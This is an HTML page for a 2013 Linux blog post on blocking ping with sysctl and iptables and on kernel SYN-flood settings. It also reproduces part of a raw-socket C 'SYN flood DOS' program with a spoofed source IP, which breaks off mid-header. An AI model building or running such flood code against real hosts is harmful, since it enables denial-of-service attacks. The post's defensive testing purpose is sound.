@@ -1,0 +1,918 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>The Art of Banning Ping Command and SYN Flood - Lin's linux blog</title>
+  <meta name="author" content="Taolinran">
+
+  
+  <meta name="description" content="1. The theory of ping. 2. kernel about help doc 1
+yum install -y kernel-doc.noarch kernel-doc.noarch : Various documentation bits found in the kernel &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://lin-credible.github.io/blog/2013/05/07/the-art-of-banning-ping-command">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Lin's linux blog" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<!--<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+function addBlankTargetForLinks () {
+  $('a[href^="http"]').each(function(){
+      $(this).attr('target', '_blank');
+  });
+}
+$(document).bind('DOMNodeInserted', function(event) {
+  addBlankTargetForLinks();
+});
+-->
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-40050631-1']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Lin's linux blog</a></h1>
+  
+    <h2>^.+*~Focus~~oO0Oo0Oo0oO0o~~Think and open mind~love linux, love~~55aa~$</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com.hk/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:lin-credible.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+  <li><a href="/about">About me</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">The Art of Banning Ping Command and SYN Flood</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-05-07T10:07:00+08:00" pubdate data-updated="true">May 7<span>th</span>, 2013</time>
+        
+         | <a href="#disqus_thread">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><h2>1. The theory of ping.</h2>
+
+<p><img src="/images/ping.jpg" alt="alt text" /><br /></p>
+
+<h2>2. kernel about</h2>
+
+<h3>help doc</h3>
+
+<figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>yum install -y kernel-doc.noarch
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>kernel-doc.noarch : Various documentation bits found in the kernel source</p>
+
+<h3>/proc/sys/net/ipv4/</h3>
+
+<h4>My test environment</h4>
+
+<!-- more -->
+
+
+<p><img src="/images/ping_art.jpg" alt="alt text" /><br /></p>
+
+<h4>test prepare</h4>
+
+<p>Show IP Address in prompt</p>
+
+<figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">export </span><span class="nv">PS1</span><span class="o">=</span><span class="s2">&quot;[\u@`hostname -I` \W]$ &quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Show Internet IP Address in prompt</p>
+
+<figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">export </span><span class="nv">PS1</span><span class="o">=</span><span class="s2">&quot;[\u@`curl ifconfig.me` \W]$ &quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>or here, It&#8217;s faster.</p>
+
+<figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">export </span><span class="nv">PS1</span><span class="o">=</span><span class="s2">&quot;[\u@`curl icanhazip.com` \W]$ &quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>2.1 icmp_echo_ignore_all</h4>
+
+<figure class='code'><figcaption><span>192.168.10.78/default - awesome.rb </span></figcaption>
+ <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="n">echo</span> <span class="mi">0</span> <span class="o">&gt;</span> <span class="sr">/proc/s</span><span class="n">ys</span><span class="o">/</span><span class="n">net</span><span class="o">/</span><span class="n">ipv4</span><span class="o">/</span><span class="n">icmp_echo_ignore_all</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="/images/ping/icmp_echo_ignore_all_0.jpg" alt="alt text" /><br /></p>
+
+<figure class='code'><figcaption><span>192.168.10.78 - awesome.rb </span></figcaption>
+ <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="n">echo</span> <span class="mi">1</span> <span class="o">&gt;</span> <span class="sr">/proc/s</span><span class="n">ys</span><span class="o">/</span><span class="n">net</span><span class="o">/</span><span class="n">ipv4</span><span class="o">/</span><span class="n">icmp_echo_ignore_all</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="/images/ping/icmp_echo_ignore_all_1.jpg" alt="alt text" /><br /></p>
+
+<h4>2.2 icmp_echo_ignore_broadcasts</h4>
+
+<figure class='code'><figcaption><span>192.168.10.78 - awesome.rb </span></figcaption>
+ <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="n">echo</span> <span class="mi">0</span> <span class="o">&gt;</span><span class="sr">/proc/s</span><span class="n">ys</span><span class="o">/</span><span class="n">net</span><span class="o">/</span><span class="n">ipv4</span><span class="o">/</span><span class="n">icmp_echo_ignore_broadcasts</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span>192.168.10.112/ping - awesome.rb </span></figcaption>
+ <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="o">[</span><span class="n">root</span><span class="err">@</span><span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>  <span class="o">/]</span><span class="vg">$ping</span> <span class="o">-</span><span class="n">b</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">255</span>
+</span><span class='line'><span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">.</span>
+</span><span class='line'><span class="mi">64</span> <span class="n">bytes</span> <span class="n">from</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">78</span><span class="p">:</span> <span class="n">icmp_seq</span><span class="o">=</span><span class="mi">51</span> <span class="n">ttl</span><span class="o">=</span><span class="mi">128</span> <span class="n">time</span><span class="o">=</span><span class="mi">0</span><span class="o">.</span><span class="mi">565</span> <span class="n">ms</span>
+</span><span class='line'><span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">.</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>if set <strong><em>1</em></strong>, there is no reply.<br /></p>
+
+<h4>2.3 ip_default_ttl</h4>
+
+<p>&#8230;</p>
+
+<h4>2.4 ip_local_port_range</h4>
+
+<p>&#8230;
+&#8230;&#8230;</p>
+
+<h2>3. iptables</h2>
+
+<figure class='code'><figcaption><span>iptables - awesome.rb </span></figcaption>
+ <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="n">iptables</span> <span class="o">-</span><span class="n">A</span> <span class="no">INPUT</span> <span class="o">-</span><span class="n">s</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">111</span> <span class="o">-</span><span class="nb">p</span> <span class="n">icmp</span> <span class="o">-</span><span class="n">j</span> <span class="no">DROP</span>
+</span><span class='line'><span class="n">iptables</span> <span class="o">-</span><span class="n">A</span> <span class="no">INPUT</span> <span class="o">-</span><span class="n">s</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">111</span> <span class="o">-</span><span class="nb">p</span> <span class="n">icmp</span> <span class="o">-</span><span class="n">j</span> <span class="no">REJECT</span>
+</span><span class='line'><span class="n">iptables</span> <span class="o">-</span><span class="n">t</span> <span class="n">filter</span> <span class="o">-</span><span class="n">A</span> <span class="no">INPUT</span> <span class="o">-</span><span class="n">S</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">111</span> <span class="o">-</span><span class="nb">p</span> <span class="n">icmp</span> <span class="o">-</span><span class="n">j</span> <span class="no">REJECT</span> <span class="o">--</span><span class="n">reject</span><span class="o">-</span><span class="n">with</span> <span class="n">icmp</span><span class="o">-</span><span class="n">host</span><span class="o">-</span><span class="n">unreachable</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>They are different, try it!</p>
+
+<h2>4. SYN Flood Test</h2>
+
+<h3>Kernel about</h3>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cat /usr/share/doc/kernel-doc-2.6.32/Documentation/networking/ip-sysctl.txt</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>tcp_fin_timeout</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>tcp_fin_timeout - INTEGER
+</span><span class='line'>        Time to hold socket in state FIN-WAIT-2, if it was closed
+</span><span class='line'>        by our side. Peer can be broken and never close its side,
+</span><span class='line'>        or even died unexpectedly. Default value is 60sec.
+</span><span class='line'>        Usual value used in 2.2 was 180 seconds, you may restore
+</span><span class='line'>        it, but remember that if your machine is even underloaded WEB server,
+</span><span class='line'>        you risk to overflow memory with kilotons of dead sockets,
+</span><span class='line'>        FIN-WAIT-2 sockets are less dangerous than FIN-WAIT-1,
+</span><span class='line'>        because they eat maximum 1.5K of memory, but they tend
+</span><span class='line'>        to live longer. Cf. tcp_max_orphans.</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>tcp_max_syn_backlog</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>tcp_max_syn_backlog - INTEGER
+</span><span class='line'>        Maximal number of remembered connection requests, which have not
+</span><span class='line'>        received an acknowledgment from connecting client.
+</span><span class='line'>        The minimal value is 128 for low memory machines, and it will
+</span><span class='line'>        increase in proportion to the memory of machine.
+</span><span class='line'>        If server suffers from overload, try increasing this number.</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>tcp_syn_retries</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>tcp_syn_retries - INTEGER
+</span><span class='line'>        Number of times initial SYNs for an active TCP connection attempt
+</span><span class='line'>        will be retransmitted. Should not be higher than 255. Default value
+</span><span class='line'>        is 5, which corresponds to ~180seconds.</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>tcp_syncookies</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>tcp_syncookies - BOOLEAN
+</span><span class='line'>        Only valid when the kernel was compiled with CONFIG_SYNCOOKIES
+</span><span class='line'>        Send out syncookies when the syn backlog queue of a socket
+</span><span class='line'>        overflows. This is to prevent against the common 'SYN flood attack'
+</span><span class='line'>        Default: FALSE
+</span><span class='line'>
+</span><span class='line'>        Note, that syncookies is fallback facility.
+</span><span class='line'>        It MUST NOT be used to help highly loaded servers to stand
+</span><span class='line'>        against legal connection rate. If you see SYN flood warnings
+</span><span class='line'>        in your logs, but investigation shows that they occur
+</span><span class='line'>        because of overload with legal connections, you should tune
+</span><span class='line'>        another parameters until this warning disappear.
+</span><span class='line'>        See: tcp_max_syn_backlog, tcp_synack_retries, tcp_abort_on_overflow.
+</span><span class='line'>
+</span><span class='line'>        syncookies seriously violate TCP protocol, do not allow
+</span><span class='line'>        to use TCP extensions, can result in serious degradation
+</span><span class='line'>        of some services (f.e. SMTP relaying), visible not by you,
+</span><span class='line'>        but your clients and relays, contacting you. While you see
+</span><span class='line'>        SYN flood warnings in logs not being really flooded, your server
+</span><span class='line'>        is seriously misconfigured.</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>tcp_synack_retries</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>tcp_synack_retries - INTEGER
+</span><span class='line'>        Number of times SYNACKs for a passive TCP connection attempt will
+</span><span class='line'>        be retransmitted. Should not be higher than 255. Default value
+</span><span class='line'>        is 5, which corresponds to ~180seconds.</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>SYN Flood Test DOS Attack with C Source Code (Linux)</h3>
+
+<figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+<span class='line-number'>101</span>
+<span class='line-number'>102</span>
+<span class='line-number'>103</span>
+<span class='line-number'>104</span>
+<span class='line-number'>105</span>
+<span class='line-number'>106</span>
+<span class='line-number'>107</span>
+<span class='line-number'>108</span>
+<span class='line-number'>109</span>
+<span class='line-number'>110</span>
+<span class='line-number'>111</span>
+<span class='line-number'>112</span>
+<span class='line-number'>113</span>
+<span class='line-number'>114</span>
+<span class='line-number'>115</span>
+<span class='line-number'>116</span>
+<span class='line-number'>117</span>
+<span class='line-number'>118</span>
+<span class='line-number'>119</span>
+<span class='line-number'>120</span>
+<span class='line-number'>121</span>
+<span class='line-number'>122</span>
+<span class='line-number'>123</span>
+<span class='line-number'>124</span>
+<span class='line-number'>125</span>
+<span class='line-number'>126</span>
+<span class='line-number'>127</span>
+<span class='line-number'>128</span>
+<span class='line-number'>129</span>
+<span class='line-number'>130</span>
+<span class='line-number'>131</span>
+<span class='line-number'>132</span>
+<span class='line-number'>133</span>
+<span class='line-number'>134</span>
+<span class='line-number'>135</span>
+<span class='line-number'>136</span>
+<span class='line-number'>137</span>
+<span class='line-number'>138</span>
+<span class='line-number'>139</span>
+<span class='line-number'>140</span>
+<span class='line-number'>141</span>
+<span class='line-number'>142</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cm">/*</span>
+</span><span class='line'><span class="cm">    Syn Flood DOS with LINUX sockets</span>
+</span><span class='line'><span class="cm">*/</span>
+</span><span class='line'><span class="cp">#include&lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include&lt;string.h&gt; </span><span class="c1">//memset</span>
+</span><span class='line'><span class="cp">#include&lt;sys/socket.h&gt;</span>
+</span><span class='line'><span class="cp">#include&lt;stdlib.h&gt; </span><span class="c1">//for exit(0);</span>
+</span><span class='line'><span class="cp">#include&lt;errno.h&gt; </span><span class="c1">//For errno - the error number</span>
+</span><span class='line'><span class="cp">#include&lt;netinet/tcp.h&gt;   </span><span class="c1">//Provides declarations for tcp header</span>
+</span><span class='line'><span class="cp">#include&lt;netinet/ip.h&gt;    </span><span class="c1">//Provides declarations for ip header</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">struct</span> <span class="n">pseudo_header</span>    <span class="c1">//needed for checksum calculation</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">source_address</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">dest_address</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">placeholder</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">protocol</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">tcp_length</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">tcphdr</span> <span class="n">tcp</span><span class="p">;</span>
+</span><span class='line'><span class="p">};</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">unsigned</span> <span class="kt">short</span> <span class="nf">csum</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">short</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span><span class="kt">int</span> <span class="n">nbytes</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="k">register</span> <span class="kt">long</span> <span class="n">sum</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">oddbyte</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">register</span> <span class="kt">short</span> <span class="n">answer</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">sum</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">while</span><span class="p">(</span><span class="n">nbytes</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>        <span class="n">sum</span><span class="o">+=*</span><span class="n">ptr</span><span class="o">++</span><span class="p">;</span>
+</span><span class='line'>        <span class="n">nbytes</span><span class="o">-=</span><span class="mi">2</span><span class="p">;</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">nbytes</span><span class="o">==</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>        <span class="n">oddbyte</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>        <span class="o">*</span><span class="p">((</span><span class="n">u_char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">oddbyte</span><span class="p">)</span><span class="o">=*</span><span class="p">(</span><span class="n">u_char</span><span class="o">*</span><span class="p">)</span><span class="n">ptr</span><span class="p">;</span>
+</span><span class='line'>        <span class="n">sum</span><span class="o">+=</span><span class="n">oddbyte</span><span class="p">;</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">sum</span> <span class="o">=</span> <span class="p">(</span><span class="n">sum</span><span class="o">&gt;&gt;</span><span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="n">sum</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">sum</span> <span class="o">=</span> <span class="n">sum</span> <span class="o">+</span> <span class="p">(</span><span class="n">sum</span><span class="o">&gt;&gt;</span><span class="mi">16</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">answer</span><span class="o">=</span><span class="p">(</span><span class="kt">short</span><span class="p">)</span><span class="o">~</span><span class="n">sum</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">return</span><span class="p">(</span><span class="n">answer</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="c1">//Create a raw socket</span>
+</span><span class='line'>    <span class="kt">int</span> <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span> <span class="p">(</span><span class="n">PF_INET</span><span class="p">,</span> <span class="n">SOCK_RAW</span><span class="p">,</span> <span class="n">IPPROTO_TCP</span><span class="p">);</span>
+</span><span class='line'>    <span class="c1">//Datagram to represent the packet</span>
+</span><span class='line'>    <span class="kt">char</span> <span class="n">datagram</span><span class="p">[</span><span class="mi">4096</span><span class="p">]</span> <span class="p">,</span> <span class="n">source_ip</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+</span><span class='line'>    <span class="c1">//IP header</span>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">iphdr</span> <span class="o">*</span><span class="n">iph</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">iphdr</span> <span class="o">*</span><span class="p">)</span> <span class="n">datagram</span><span class="p">;</span>
+</span><span class='line'>    <span class="c1">//TCP header</span>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">tcphdr</span> <span class="o">*</span><span class="n">tcph</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">tcphdr</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">datagram</span> <span class="o">+</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">ip</span><span class="p">));</span>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">sin</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">pseudo_header</span> <span class="n">psh</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">strcpy</span><span class="p">(</span><span class="n">source_ip</span> <span class="p">,</span> <span class="s">&quot;192.168.10.78&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">sin</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">sin</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">80</span><span class="p">);</span>
+</span><span class='line'>    <span class="c1">//sin.sin_addr.s_addr = inet_addr (&quot;192.168.10.78&quot;);</span>
+</span><span class='line'>    <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span> <span class="p">(</span><span class="s">&quot;10.10.24.79&quot;</span><span class="p">);</span>
+</span><span class='line'>    <span class="c1">//sin.sin_addr.s_addr = inet_addr (&quot;192.168.10.111&quot;);</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">memset</span> <span class="p">(</span><span class="n">datagram</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">4096</span><span class="p">);</span> <span class="cm">/* zero out the buffer */</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c1">//Fill in the IP Header</span>
+</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">ihl</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">version</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">tos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">tot_len</span> <span class="o">=</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">ip</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">tcphdr</span><span class="p">);</span>
